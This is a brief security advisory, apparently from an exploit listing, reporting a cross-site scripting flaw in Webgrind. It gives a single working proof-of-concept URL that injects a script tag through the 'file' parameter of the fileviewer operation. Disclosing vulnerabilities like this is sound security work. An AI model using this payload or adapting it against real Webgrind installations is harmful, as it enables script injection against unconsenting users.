Advisory Information:
=====================================================
Webgrind is vulnerable to cross site scripting attacks.

Exploit code:
==============
http://localhost/webgrind/index.php?op=fileviewer&file=%3Cscript%3Ealert('XSS hyp3rlinx')%3C/script%3E

